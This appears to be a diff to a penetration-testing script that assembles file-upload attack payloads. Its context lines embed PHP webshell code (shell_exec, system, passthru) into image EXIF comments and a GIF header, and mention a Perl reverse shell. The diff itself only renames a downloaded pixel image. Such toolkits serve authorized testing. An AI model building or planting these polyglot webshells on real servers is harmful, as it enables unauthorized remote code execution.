@@ -66,23 +66,23 @@ echo "GIF89;" > passthru.gif; cat passthru.php >> passthru.gif
 # https://github.com/aureooms/pixels
 banner "payloads_common: jpg with php"
 wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
-cp 1x1%23000000.jpg shell_exec.jpg
+cp 1x1#000000.jpg shell_exec.jpg
 exiftool -Comment="`cat shell_exec.php`" shell_exec.jpg
-cp 1x1%23000000.jpg system.jpg
+cp 1x1#000000.jpg system.jpg
 exiftool -Comment="`cat system.php`" system.jpg
-cp 1x1%23000000.jpg passthru.jpg
+cp 1x1#000000.jpg passthru.jpg
 exiftool -Comment="`cat passthru.php`" passthru.jpg
-rm 1x1%23000000.jpg
+rm 1x1#000000.jpg
 
 banner "payloads_common: png with php"
 wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
-cp 1x1%23000000.png shell_exec.png
+cp 1x1#000000.png shell_exec.png
 exiftool -Comment="`cat shell_exec.php`" shell_exec.png
-cp 1x1%23000000.png system.png
+cp 1x1#000000.png system.png
 exiftool -Comment="`cat system.php`" system.png
-cp 1x1%23000000.png passthru.png
+cp 1x1#000000.png passthru.png
 exiftool -Comment="`cat passthru.php`" passthru.png
-rm 1x1%23000000.png
+rm 1x1#000000.png
 
 banner "payloads_common: pentestmonkey-perl-reverse-shell.pl"
 rm pentestmonkey-perl-reverse-shell.pl
